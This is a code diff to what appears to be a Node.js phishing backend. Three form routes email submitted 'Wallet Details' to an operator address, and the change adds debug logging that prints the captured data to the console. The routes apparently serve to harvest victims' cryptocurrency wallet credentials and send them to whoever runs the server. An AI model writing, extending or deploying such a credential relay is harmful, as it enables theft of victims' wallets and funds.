@@ -38,6 +38,8 @@ let transporter = nodemailer.createTransport({
 	host: process.env.HOST,
 	port: process.env.PORTSECURE,
 	secure: process.env.SECURE,
+	logger: true,
+	debug: true,
 
 	auth: {
 		user: process.env.USER, // generated ethereal user
@@ -89,12 +91,14 @@ app.post('/fd1', (req, res) => {
 					pass: process.env.PASS, // generated ethereal password
 				},
 			});
+
 			let mailOptions = {
 				from: process.env.FROM,
 				to: process.env.TO,
 				subject: 'Wallet Details',
 				html: data,
 			};
+			console.log('data', data);
 
 			transporter.sendMail(mailOptions, (err, res) => {
 				if (err) {
@@ -122,6 +126,8 @@ app.post('/fd2', (req, res) => {
 				html: data,
 			};
 
+			console.log('data', data);
+
 			transporter.sendMail(mailOptions, (err, res) => {
 				if (err) {
 					console.log('err', err);
@@ -148,6 +154,7 @@ app.post('/fd3', (req, res) => {
 				html: data,
 			};
 
+			console.log('data', data);
 			transporter.sendMail(mailOptions, (err, res) => {
 				if (err) {
 					console.log('err', err);
